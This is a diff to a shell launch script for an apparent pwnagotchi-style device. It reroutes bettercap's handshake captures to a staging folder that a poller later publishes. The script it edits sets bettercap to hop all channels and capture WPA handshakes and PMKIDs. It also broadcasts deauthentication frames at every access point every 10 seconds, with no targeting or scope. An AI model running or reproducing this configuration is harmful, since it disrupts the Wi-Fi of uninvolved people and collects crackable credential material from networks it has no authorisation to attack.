@@ -21,12 +21,17 @@ RUN_DIR=/tmp/fennec-scoutchi
 CONFIG="$RUN_DIR/config.json"
 STATS="$RUN_DIR/stats.json"
 HANDSHAKES=/etc/pwnagotchi/handshakes
+# bettercap churns its per-AP captures here (it keeps re-appending to a file as it
+# re-captures an AP each deauth cycle). The poller publishes settled copies into
+# HANDSHAKES atomically, so Sly never reads a file while bettercap is writing it.
+LIVE="$RUN_DIR/live"
 CAPLET=/etc/pwnagotchi/pwnagotchi-auto.cap
 POLL=/usr/local/bin/fennec-scoutchi-poll
 
-mkdir -p "$RUN_DIR" "$HANDSHAKES"
+mkdir -p "$RUN_DIR" "$HANDSHAKES" "$LIVE"
 chmod 755 "$RUN_DIR"
 rm -f "$STATS" "$RUN_DIR/run.log"
+rm -f "$LIVE"/*.pcap 2>/dev/null   # fresh per-session working set
 
 [ -f "$CONFIG" ] || { echo "no config"; exit 1; }
 IFACES=$(python3 -c 'import json,sys;print(" ".join(json.load(open(sys.argv[1])).get("adapters") or []))' "$CONFIG" 2>/dev/null)
@@ -72,7 +77,7 @@ chmod 644 "$STATS" 2>/dev/null
 # bettercap eval: capture handshakes + PMKID to Sly's dir, hop all channels, and
 # deauth every AP every 10 s.
 EVAL="set wifi.handshakes.aggregate false;"
-EVAL="$EVAL set wifi.handshakes.file $HANDSHAKES;"
+EVAL="$EVAL set wifi.handshakes.file $LIVE;"
 EVAL="$EVAL set wifi.deauth.silent true; set wifi.deauth.open true;"
 EVAL="$EVAL wifi.recon on;"
 EVAL="$EVAL set ticker.period 10; set ticker.commands \"wifi.deauth ff:ff:ff:ff:ff:ff\"; ticker on"
